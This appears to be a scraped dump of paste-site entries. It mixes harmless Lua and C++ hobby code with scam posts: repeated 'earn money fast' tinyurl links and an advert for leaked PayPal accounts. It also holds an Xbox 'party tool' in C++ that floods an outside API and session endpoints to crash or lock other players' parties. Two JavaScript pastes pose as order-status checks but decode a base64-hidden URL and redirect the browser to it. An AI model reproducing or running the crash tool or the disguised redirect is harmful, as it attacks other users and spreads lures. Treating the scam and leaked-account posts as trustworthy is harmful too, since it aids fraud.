id,title,username,language,date,content
X0B3xiH8,Make $1000 15-MINUTES  (BEGINNER) ME,jrgsdv,JavaScript,Sunday 27th of April 2025 01:05:52 AM CDT," 
Pdf https://tinyurl.com/privguidee

cCRjKO7ykv
"
8cpPXKjZ,三维定位 426 v2,jaklsfjlsak,Lua,Sunday 27th of April 2025 01:02:19 AM CDT,"-- 3D-Offset-Driven Ship Jump & Mining-Laser Align
-- Listens for { x, y, z } on Rednet protocol ""3DOffsetBroadcast""
-- and computes an offset jump point back toward the ship.

-- 1) Configuration
local offsetDistance = 25

-- 2) Wrap your ship core
local ship = peripheral.find(""warpdriveShipCore"")
assert(ship, ""No warpdriveShipCore detected!"")

-- 3) Pre-compute ship dimensions & status
local ship_front, ship_right, ship_up   = ship.dim_positive()
local ship_back,  ship_left,  ship_down = ship.dim_negative()

-- 4) Instructions
print(""Waiting for 3DOffsetBroadcast → Redstone 'front' must be ON to accept jumps"")

-- 5) Open Rednet on all modems
for _, side in ipairs(peripheral.getNames()) do
  if peripheral.getType(side) == ""modem"" then
    rednet.open(side)
  end
end

-- 6) Main loop: only react when redstone 'front' is high
while true do
  if redstone.getInput(""front"") then
    -- wait up to 0.5s for a broadcast on 3DOffsetBroadcast
    local sender, message = rednet.receive(""3DOffsetBroadcast"", 0.5)
    if sender and message.x and message.y and message.z then
      local lastLx, lastLy, lastLz =
        tonumber(message.x),
        tonumber(message.y),
        tonumber(message.z)

      print(string.format(
        ""Received target from %d → X:%d  Y:%d  Z:%d"",
        sender, lastLx, lastLy, lastLz
      ))

      -- ship current position
      local mx, my, mz = ship.getLocalPosition()

      -- vector from laser target back toward ship
      local vx, vy, vz = mx - lastLx, my - lastLy, mz - lastLz
      local dist = math.sqrt(vx*vx + vy*vy + vz*vz)

      if dist > 0 then
        -- unit vector
        local ux, uy, uz = vx/dist, vy/dist, vz/dist

        -- offset point
        local dx = math.floor(lastLx + ux*offsetDistance + 0.5)
        local dy = math.floor(lastLy + uy*offsetDistance + 0.5)
        local dz = math.floor(lastLz + uz*offsetDistance + 0.5)

        print(string.format(
          ""Jump coords → X:%d  Y:%d  Z:%d"",
          dx, dy, dz
        ))

        -- orientation & thresholds
        local rx, ry, rz    = ship.getOrientation()
        local minFB         = math.abs(ship_front + ship_back + 1)
        local minLR         = math.abs(ship_left  + ship_right + 1)
        local minUD         = math.abs(ship_up    + ship_down + 1)

        -- desired move in world-space
        local jx, jy, jz    = dx - mx, dy - my, dz - mz

        -- map to ship axes
        local fb, lr = 0, 0
        local ud      = jy
        if     rx ==  1 then fb, lr = jx,  jz
        elseif rx == -1 then fb, lr = -jx, -jz
        elseif rz ==  1 then fb, lr = jz, -jx
        elseif rz == -1 then fb, lr = -jz, jx
        end

        -- threshold check
        if math.abs(fb) < minFB
           and math.abs(ud) < minUD
           and math.abs(lr) < minLR then
          print(""Movement too small—skipping jump."")
        else
          ship.movement(fb, ud, lr)
          ship.rotationSteps(0)
          ship.command(""MANUAL"", true)
        end
      else
        print(""Error: ship and target coincide—no movement."")
      end
    end
  else
    -- redstone is off, pause briefly
    os.sleep(0.1)
  end
end
"
0UzhHsCA,Untitled,zpolice281,C++,Sunday 27th of April 2025 01:02:10 AM CDT,"#include <windows.h>
#include <commctrl.h>
#include <iostream>
#include <string>
#include <memory>
#include <ppltasks.h>
#include <xbox/live/xbox_live.h>
#include <winrt/Windows.Web.Http.h>
#include <winrt/Windows.Security.Authentication.Web.Core.h>
#include <winrt/Windows.Security.Credentials.h>
#include <winrt/Windows.Data.Json.h>

using namespace concurrency;
using namespace winrt;
using namespace winrt::Windows::Web::Http;
using namespace winrt::Windows::Security::Authentication::Web::Core;
using namespace winrt::Windows::Security::Credentials;
using namespace winrt::Windows::Data::Json;
using namespace xbox::services;
using namespace xbox::services::system;

// Config
const std::wstring XBL_TOKEN = L""YOUR_XBL_TOKEN_HERE""; // Replace with your XBL token
const std::wstring XBL_AUTH_URL = L""https://xsts.auth.xboxlive.com/xsts/authorize"";
const std::wstring PROFILE_URL = L""https://profile.xboxlive.com/users/me/profile/settings"";
const std::wstring SESSIONS_URL = L""https://sessiondirectory.xboxlive.com/sessions"";
const std::wstring SESSION_URL_BASE = L""https://sessiondirectory.xboxlive.com/handles/"";
const std::wstring PARTYHAX_API_BASE = L""https://partyhax.club/api/"";

// Global variables for UI state
bool unkickable_enabled = false;
int crash_intensity = 1;
std::wstring current_xsts_token;
std::wstring current_session_id;
std::wstring current_xuid;
int selected_action = 0; // 0 = Crash, 1 = Lock

// UI control IDs
#define IDC_TAB 1000
#define IDC_TOGGLE 1001
#define IDC_SLIDER 1002
#define IDC_BUTTON 1003
#define IDC_COMBO 1004

// Function to get XSTS token from XBL token
task<xbox_live_result<token_and_signature_result>> get_xsts_token(const std::wstring& xbl_token)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Post(), Uri(XBL_AUTH_URL));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xbl_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    std::wstring payload = L""{\""Properties\"":{\""SandboxId\"":\""RETAIL\"",\""UserTokens\"":[\"""" + xbl_token + L""\""]},\""RelyingParty\"":\""http://xboxlive.com\"",\""TokenType\"":\""JWT\""}"";
    request.Content(HttpStringContent(payload));
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                std::wstring token = result;
                return xbox_live_result<token_and_signature_result>(token_and_signature_result(token, L""""));
            }
            throw std::runtime_error(""Failed to get XSTS token"");
        });
}

// Function to get XUID from profile
task<std::wstring> get_xuid(const std::wstring& xsts_token)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Get(), Uri(PROFILE_URL));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xsts_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                JsonObject json = JsonObject::Parse(result);
                std::wstring xuid = json.GetNamedString(L""id"");
                return xuid;
            }
            throw std::runtime_error(""Failed to get XUID"");
        });
}

// Function to get current party session ID
task<std::wstring> get_party_session_id(const std::wstring& xsts_token, const std::wstring& xuid)
{
    HttpClient client;
    HttpRequestMessage request(HttpMethod::Get(), Uri(SESSIONS_URL + L""?xuid="" + xuid));
    
    request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xsts_token);
    request.Headers().Append(L""Content-Type"", L""application/json"");
    request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                auto result = response.Content().ReadAsStringAsync().get();
                JsonObject json = JsonObject::Parse(result);
                JsonArray sessions = json.GetNamedArray(L""sessions"");
                if (sessions.Size() > 0) {
                    std::wstring session_id = sessions.GetObjectAt(0).GetNamedString(L""sessionId"");
                    return session_id;
                }
                throw std::runtime_error(""No active party sessions found"");
            }
            throw std::runtime_error(""Failed to get sessions"");
        });
}

// Function to make yourself unkickable using PartyHax API
task<void> make_unkickable(const std::wstring& xbl_token, const std::wstring& xuid)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartyunkickable/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                std::cout << ""PartyHax API: Successfully made unkickable.\n"";
            } else {
                std::cerr << ""PartyHax API: Failed to make unkickable. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
            }
        });
}

// Function to crash the party using PartyHax API with fallback
task<void> crash_party(const std::wstring& xbl_token, const std::wstring& xuid, const std::wstring& session_id, int intensity)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartycrash/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    bool partyhax_success = false;
    for (int i = 0; i < intensity; ++i) {
        create_task(client.SendRequestAsync(request))
            .then([&partyhax_success](HttpResponseMessage response) {
                if (response.StatusCode() == HttpStatusCode::Ok) {
                    std::cout << ""PartyHax API: Crash request sent.\n"";
                    partyhax_success = true;
                } else {
                    std::cerr << ""PartyHax API: Crash request failed. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
                }
            });
        Sleep(50);
    }
    
    // Fallback to direct Xbox Live method if PartyHax fails
    if (!partyhax_success && !session_id.empty()) {
        std::cout << ""Falling back to direct Xbox Live crash method...\n"";
        HttpRequestMessage fallback_request(HttpMethod::Post(), Uri(SESSION_URL_BASE + session_id + L""/join""));
        fallback_request.Headers().Append(L""Authorization"", L""XBL3.0 x="" + xbl_token);
        fallback_request.Headers().Append(L""Content-Type"", L""application/json"");
        fallback_request.Headers().Append(L""X-Xbl-Contract-Version"", L""2"");
        
        std::wstring payload = L""{\""userId\"":\""FORCE_CRASH\"",\""inviteId\"":null,\""bypassInvite\"":true,\""overload\"":true,\""crashApp\"":true}"";
        fallback_request.Content(HttpStringContent(payload));
        
        for (int i = 0; i < intensity; ++i) {
            create_task(client.SendRequestAsync(fallback_request))
                .then([](HttpResponseMessage response) {
                    std::cout << ""Fallback: Crash request sent. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
                });
            Sleep(50);
        }
    }
    
    return create_task([]() {});
}

// Function to lock the party using PartyHax API
task<void> lock_party(const std::wstring& xbl_token, const std::wstring& xuid)
{
    HttpClient client;
    std::wstring url = PARTYHAX_API_BASE + L""xboxpartylock/xuid="" + xuid + L"",Token="" + xbl_token;
    HttpRequestMessage request(HttpMethod::Get(), Uri(url));
    
    request.Headers().Append(L""Content-Type"", L""application/json"");
    
    return create_task(client.SendRequestAsync(request))
        .then([](HttpResponseMessage response) {
            if (response.StatusCode() == HttpStatusCode::Ok) {
                std::cout << ""PartyHax API: Party locked successfully.\n"";
            } else {
                std::cerr << ""PartyHax API: Failed to lock party. Status: "" << static_cast<int>(response.StatusCode()) << ""\n"";
            }
        });
}

// Window procedure for the UI
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static HWND hwndTab, hwndToggle, hwndSlider, hwndButton, hwndCombo;
    static HFONT hFont;

    switch (msg)
    {
    case WM_CREATE:
    {
        // Initialize common controls
        INITCOMMONCONTROLSEX icex;
        icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
        icex.dwICC = ICC_TAB_CLASSES | ICC_TRACKBAR_CLASS;
        InitCommonControlsEx(&icex);

        // Create font
        hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET,
                           OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                           DEFAULT_PITCH | FF_SWISS, L""Segoe UI"");

        // Create tab control
        hwndTab = CreateWindow(WC_TABCONTROL, L"""", WS_CHILD | WS_VISIBLE,
                               5, 5, 390, 290, hwnd, (HMENU)IDC_TAB, GetModuleHandle(NULL), NULL);
        SendMessage(hwndTab, WM_SETFONT, (WPARAM)hFont, TRUE);

        TCITEM tie;
        tie.mask = TCIF_TEXT;
        tie.pszText = L""Party Controls"";
        TabCtrl_InsertItem(hwndTab, 0, &tie);

        // Create toggle (checkbox)
        hwndToggle = CreateWindow(L""BUTTON"", L""Unkickable"", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                  20, 40, 150, 30, hwnd, (HMENU)IDC_TOGGLE, GetModuleHandle(NULL), NULL);
        SendMessage(hwndToggle, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create slider
        CreateWindow(L""STATIC"", L""Crash Intensity: 1"", WS_CHILD | WS_VISIBLE,
                     20, 80, 150, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
        hwndSlider = CreateWindow(TRACKBAR_CLASS, L"""", WS_CHILD | WS_VISIBLE | TBS_AUTOTICKS,
                                  20, 100, 200, 30, hwnd, (HMENU)IDC_SLIDER, GetModuleHandle(NULL), NULL);
        SendMessage(hwndSlider, TBM_SETRANGE, TRUE, MAKELONG(1, 20));
        SendMessage(hwndSlider, TBM_SETPOS, TRUE, 1);
        SendMessage(hwndSlider, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create dropdown
        hwndCombo = CreateWindow(WC_COMBOBOX, L"""", WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST,
                                 20, 140, 150, 100, hwnd, (HMENU)IDC_COMBO, GetModuleHandle(NULL), NULL);
        SendMessage(hwndCombo, CB_ADDSTRING, 0, (LPARAM)L""Crash Party"");
        SendMessage(hwndCombo, CB_ADDSTRING, 0, (LPARAM)L""Lock Party"");
        SendMessage(hwndCombo, CB_SETCURSEL, 0, 0);
        SendMessage(hwndCombo, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Create button
        hwndButton = CreateWindow(L""BUTTON"", L""Execute"", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                  20, 180, 100, 30, hwnd, (HMENU)IDC_BUTTON, GetModuleHandle(NULL), NULL);
        SendMessage(hwndButton, WM_SETFONT, (WPARAM)hFont, TRUE);

        // Set dark theme
        SetWindowLong(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) | WS_CLIPCHILDREN);
        SetBkColor(GetDC(hwnd), RGB(30, 30, 30));
        break;
    }
    case WM_COMMAND:
    {
        if (LOWORD(wParam) == IDC_TOGGLE)
        {
            unkickable_enabled = (SendMessage(hwndToggle, BM_GETCHECK, 0, 0) == BST_CHECKED);
            if (unkickable_enabled && !current_xuid.empty())
            {
                make_unkickable(XBL_TOKEN, current_xuid);
            }
        }
        if (LOWORD(wParam) == IDC_COMBO)
        {
            if (HIWORD(wParam) == CBN_SELCHANGE)
            {
                selected_action = SendMessage(hwndCombo, CB_GETCURSEL, 0, 0);
            }
        }
        if (LOWORD(wParam) == IDC_BUTTON)
        {
            if (!current_xuid.empty())
            {
                switch (selected_action)
                {
                case 0: // Crash Party
                    crash_party(XBL_TOKEN, current_xuid, current_session_id, crash_intensity);
                    break;
                case 1: // Lock Party
                    lock_party(XBL_TOKEN, current_xuid);
                    break;
                }
            }
            else
            {
                MessageBox(hwnd, L""XUID not found. Ensure auth succeeded and try again."", L""Error"", MB_OK | MB_ICONERROR);
            }
        }
        break;
    }
    case WM_HSCROLL:
    {
        if ((HWND)lParam == hwndSlider)
        {
            crash_intensity = SendMessage(hwndSlider, TBM_GETPOS, 0, 0);
            wchar_t buf[32];
            wsprintf(buf, L""Crash Intensity: %d"", crash_intensity);
            SetWindowText(GetDlgItem(hwnd, IDC_STATIC), buf);
        }
        break;
    }
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        SetBkColor(hdc, RGB(30, 30, 30));
        SetTextColor(hdc, RGB(200, 200, 200));
        EndPaint(hwnd, &ps);
        break;
    }
    case WM_DESTROY:
        DeleteObject(hFont);
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Initialize WinRT
    winrt::init_apartment();

    // Register window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L""XboxPartyToolClass"";
    wc.hbrBackground = CreateSolidBrush(RGB(30, 30, 30));
    RegisterClass(&wc);

    // Create window
    HWND hwnd = CreateWindow(L""XboxPartyToolClass"", L""Xbox Party Tool"",
                            WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                            CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
                            NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, nCmdShow);

    // Authenticate and get XUID/session ID
    try
    {
        get_xsts_token(XBL_TOKEN)
            .then([](xbox_live_result<token_and_signature_result> result) {
                if (!result.err()) {
                    current_xsts_token = result.payload().token();
                    std::wcout << L""Got XSTS token: "" << current_xsts_token << L""\n"";
                    return current_xsts_token;
                }
                throw std::runtime_error(""Token fetch failed"");
            })
            .then([](std::wstring xsts_token) {
                return get_xuid(xsts_token)
                    .then([xsts_token](std::wstring xuid) {
                        current_xuid = xuid;
                        std::wcout << L""Got XUID: "" << xuid << L""\n"";
                        return std::make_pair(xsts_token, xuid);
                    });
            })
            .then([](std::pair<std::wstring, std::wstring> pair) {
                auto [xsts_token, xuid] = pair;
                return get_party_session_id(xsts_token, xuid)
                    .then([xsts_token, xuid](std::wstring session_id) {
                        current_session_id = session_id;
                        std::wcout << L""Got party session ID: "" << session_id << L""\n"";
                    });
            }).get();
    }
    catch (const std::exception& e)
    {
        MessageBox(hwnd, L""Failed to initialize: "" + std::wstring(e.what(), e.what() + strlen(e.what())), L""Error"", MB_OK | MB_ICONERROR);
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    winrt::uninit_apartment();
    return 0;
}"
nRV8YvXD,C++ Weapon Test,shadowlucario50,C++,Sunday 27th of April 2025 12:58:48 AM CDT,"#include <iostream>
#include <ctime>


void weapon(int tool, int atk, int def, int spd);
void weapon(int tool);

int main(){

    int hp = 100;
    int atk = 40;
    int def = 40;
    int spd = 40;
    int tool;
    
    std::cout << ""Choose a Weapon: \n"";
    for(int i=1; i <=5; i++){
        std::cout << i << "" "";
        weapon(i);
        std::cout << '\n';
    }
    std::cin >> tool;

    weapon(tool,atk,def,spd);

    return 0;
}

void weapon(int tool){
    switch (tool) {
        case 1:
            std::cout << ""Knife"";
            break;
        case 2:
            std::cout << ""Axe"";
            break;
        case 3:
            std::cout << ""Harp"";
            break;
        case 4:
            std::cout << ""Sword"";
            break;
        case 5:
            std::cout << ""Shield"";
            break;
        default:
            std::cout << ""Fists"";
            break;
    }
}

void weapon(int tool, int atk, int def, int spd) {
    switch (tool) {
        case 1:
            std::cout << ""Knife: "";
            atk += 5;
            def -= 2;
            spd += 5;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 2:
            std::cout << ""Axe: "";
            atk += 10;
            def -= 3;
            spd -= 3;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 3:
            std::cout << ""Harp: "";
            atk += 1;
            def += 3;
            spd += 2;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 4:
            std::cout << ""Sword: "";
            atk += 8;
            def -= 5;
            spd += 4;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        case 5:
            std::cout << ""Shield: "";
            atk -= 1;
            def += 9;
            spd -= 4;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
        default:
            std::cout << ""Fists: "";
            atk +=1;
            spd +=8;
            std::cout << ""\nAttack: "" << atk << ""\nDefense: "" << def << ""\nSpeed: "" << spd;
            break;
    }
}"
7h0yPVDT,Untitled,dentira,JavaScript,Sunday 27th of April 2025 12:57:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23543/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X7v4kfFf,EARN $900 INSTANTLY 2025 M6,jrgsdv,JavaScript,Sunday 27th of April 2025 12:56:36 AM CDT," 
Pdf https://tinyurl.com/privguidee

gh3OqezONO
"
99Hu4F5D,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Sunday 27th of April 2025 12:53:26 AM CDT,79742 Accounts Posted On https://t.me/leakedbyem1nem
tfqc42mJ,Pocket Todo,Alexr360,Lua,Sunday 27th of April 2025 12:51:06 AM CDT,"-- pocket_todo.lua
-- A pocket computer todo list with notes, completed section, clickable buttons, and backup command

-- Data files
local TODO_FILE      = ""todo.txt""
local NOTES_FILE     = ""notes.txt""
local COMPLETED_FILE = ""completed.txt""

-- Data tables
local items     = {}
local notes     = """"
local completed = {}

-- Utility: load list from file
local function loadList(file, tbl)
  if fs.exists(file) then
    local f = fs.open(file, ""r"")
    local line = f.readLine()
    while line do
      table.insert(tbl, line)
      line = f.readLine()
    end
    f.close()
  end
end

-- Initial load
loadList(TODO_FILE, items)
loadList(COMPLETED_FILE, completed)
if fs.exists(NOTES_FILE) then
  local f = fs.open(NOTES_FILE, ""r"")
  notes = f.readAll() or """"
  f.close()
end

-- Utility: save all data
local function save()
  local f = fs.open(TODO_FILE, ""w"")
  for _,v in ipairs(items) do f.writeLine(v) end
  f.close()
  local f2 = fs.open(COMPLETED_FILE, ""w"")
  for _,v in ipairs(completed) do f2.writeLine(v) end
  f2.close()
  local f3 = fs.open(NOTES_FILE, ""w"")
  f3.write(notes)
  f3.close()
end

-- Button mapping
local buttons = {}

-- Redraw UI to term
local function redraw()
  term.setBackgroundColor(colors.black)
  term.clear()
  term.setCursorPos(1,1)
  term.setTextColor(colors.white)
  local w,h = term.getSize()
  local y = 1
  buttons = {}

  -- Notes section
  if notes:match(""%S"") then
    term.setCursorPos(1,y)
    term.write(""Notes:"")
    y = y + 1
    local line = notes
    if #line > w then line = line:sub(1, w-3) .. ""..."" end
    term.setCursorPos(1, y)
    term.write(line)
    y = y + 1
    -- blank line after notes
    y = y + 1
  end

  -- To-Do List
  if y <= h then
    term.setCursorPos(1,y)
    term.write(""To-Do List:"")
    y = y + 1
    for i = 1, math.min(#items, h - y) do
      local text = string.format(""%2d. %s"", i, items[i])
      if #text > w-6 then text = text:sub(1, w-9) .. ""..."" end
      term.setCursorPos(1, y + i - 1)
      term.write(text)
      -- Done button
      local bx = w - 3
      term.setCursorPos(bx, y + i - 1)
      term.write(""[D]"")
      table.insert(buttons, {x1 = bx, x2 = bx + 2, y = y + i - 1, type = ""done"", idx = i})
    end
    y = y + math.min(#items, h - y) + 1
  end

  -- Completed Section
  if #completed > 0 and y <= h then
    term.setCursorPos(1,y)
    term.write(""Completed:"")
    y = y + 1
    for i = 1, math.min(#completed, h - y + 1) do
      local entry = completed[i]
      local text = ""- "" .. entry
      if #text > w-10 then text = text:sub(1, w-13) .. ""..."" end
      term.setCursorPos(1, y + i - 1)
      term.write(text)
      -- Restore button
      local rx = w - 7
      term.setCursorPos(rx, y + i - 1)
      term.write(""[R]"")
      table.insert(buttons, {x1 = rx, x2 = rx + 2, y = y + i - 1, type = ""restore"", idx = i})
      -- Delete button
      local dx = w - 3
      term.setCursorPos(dx, y + i - 1)
      term.write(""[X]"")
      table.insert(buttons, {x1 = dx, x2 = dx + 2, y = y + i - 1, type = ""delete"", idx = i})
    end
  end
end

-- Handle mouse clicks
local function handleClick(x,y)
  for _,b in ipairs(buttons) do
    if y == b.y and x >= b.x1 and x <= b.x2 then
      if b.type == ""done"" then
        table.insert(completed, items[b.idx])
        table.remove(items, b.idx)
      elseif b.type == ""restore"" then
        table.insert(items, completed[b.idx])
        table.remove(completed, b.idx)
      elseif b.type == ""delete"" then
        table.remove(completed, b.idx)
      end
      save()
      redraw()
      return
    end
  end
end

-- Initial draw
redraw()

-- Main loops: mouse and command
parallel.waitForAny(
  function()
    while true do
      local event, button, x, y = os.pullEvent(""mouse_click"")
      if button == 1 then handleClick(x,y) end
    end
  end,
  function()
    while true do
      term.setCursorPos(1,1)
      local input = read()
      local cmd, rest = input:match(""^(%S+)%s*(.*)$"") or {input, """"}
      if cmd == ""add"" and #rest > 0 then
        table.insert(items, rest)
      elseif cmd == ""remove"" and tonumber(rest) and items[tonumber(rest)] then
        table.remove(items, tonumber(rest))
      elseif cmd == ""done"" and tonumber(rest) and items[tonumber(rest)] then
        table.insert(completed, items[tonumber(rest)])
        table.remove(items, tonumber(rest))
      elseif cmd == ""clearcompleted"" then
        completed = {}
      elseif cmd == ""backup"" then
        if fs.exists(TODO_FILE) then fs.copy(TODO_FILE, ""/disk/"" .. TODO_FILE) end
        if fs.exists(COMPLETED_FILE) then fs.copy(COMPLETED_FILE, ""/disk/"" .. COMPLETED_FILE) end
        print(""Backup complete. Press Enter to continue."")
        read()
      elseif cmd == ""note"" then
        notes = rest or """"
      elseif cmd == ""clearnote"" then
        notes = """"
      elseif cmd == ""exit"" then
        print(""Goodbye!"")
        os.exit()
      else
        print(""Invalid command. Press Enter to continue."")
        read()
      end
      save()
      redraw()
    end
  end
)"
hccuBQvA,Make $1000 15-MINUTES (BEGINNER) 96,jrgsdv,JavaScript,Sunday 27th of April 2025 12:47:22 AM CDT," 
Pdf https://tinyurl.com/privguidee

PEH0gB58oO
"
31HeSR9C,Products.js,dentira,JavaScript,Sunday 27th of April 2025 12:42:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32796/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
